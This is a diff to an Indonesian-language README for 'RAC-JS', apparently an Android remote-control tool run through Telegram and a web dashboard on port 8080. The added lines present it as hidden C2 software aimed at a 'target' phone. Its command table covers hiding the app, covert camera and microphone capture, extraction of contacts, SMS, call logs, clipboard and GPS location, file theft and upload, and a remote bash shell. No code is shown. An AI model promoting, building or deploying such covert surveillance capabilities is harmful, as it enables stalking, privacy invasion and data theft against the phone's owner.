@@ -16,6 +16,36 @@ Sebuah sistem *Command and Control* (C2) cerdas dan tersembunyi untuk perangkat 
 * **Aksi Prank / Penanda Target**: Getarkan perangkat sesuka hati, paksakan (*Force Open*) layar web, ubah *Wallpaper* dengan gambar URL apapun, atau bunyikan *Alarm Darurat* dengan batas toleransi audio dimaksimalkan!
 * **Optimasi 'Smart Long-Polling'**: RAC-JS dirancang untuk benar-benar hemat daya. Aplikasi Android tidak akan memboroskan baterai (tanpa pengurasan koneksi Wi-Fi/Seluler aktif), tetapi akan mendengarkan perintah dalam mode `Long-Polling` interaktif yang merespons dalam sekejap begitu tombol ditekan.
 * **Database Cerdas (Anti-Bloatware)**: Server tidak menyimpan *Base64 string* besar di sistem SQLite, file diekstrak langsung ke format statik (`.mp4` / `.jpg`), mempertahankan kecepatan ekstrem pada dasbor Web.
+* **Dual-Access Control**: Kendali bisa dilakukan via Bot Telegram maupun **Local Web Dashboard (Port 8080)** jika perangkat berada dalam satu jaringan (atau via IPv6).
+
+---
+
+## 🎮 Daftar Perintah (C2 Commands)
+
+Akses kendali penuh melalui input teks pada Bot Telegram atau menu Dashboard:
+
+| Kategori | Command | Deskripsi |
+| :--- | :--- | :--- |
+| **Sistem** | `ping` | Tes koneksi (Respon: pong) |
+| | `get_device_info` | Tarik model, merk, dan versi Android |
+| | `get_battery` | Cek persentase baterai target |
+| | `show_toast` | Tampilkan pesan pop-up di layar HP |
+| | `hide_app` | Aktifkan Mode Kamuflase (Kunci Control Panel) |
+| | `unhide_app` | Matikan Kamuflase (Buka kembali Control Panel) |
+| **Media** | `photo front` | Ambil foto kamera depan (Selfie) |
+| | `photo back` | Ambil foto kamera belakang |
+| | `record_sound` | Rekam audio mikrofon (Payload: detik) |
+| | `tts` | Suara Google TTS (Payload: teks) |
+| | `play_alarm` | Bunyikan alarm darurat volume maksimal |
+| **Data** | `contacts` | Ekstrak seluruh daftar kontak |
+| | `sms_list` | Tarik seluruh pesan SMS masuk |
+| | `location` | Tangkap koordinat GPS & link G-Maps |
+| | `get_call_logs` | Tarik riwayat panggilan telepon |
+| | `clipboard` | Baca data salinan (Copy/Paste) terbaru |
+| **File & Pro** | `ls` | Penjelajah file (File Explorer) |
+| | `download` | Sedot file dari HP ke Telegram |
+| | `upload` | Susupkan file dari Telegram ke HP |
+| | `shell` | Eksekusi terminal BASH secara remote |
 
 ---
 
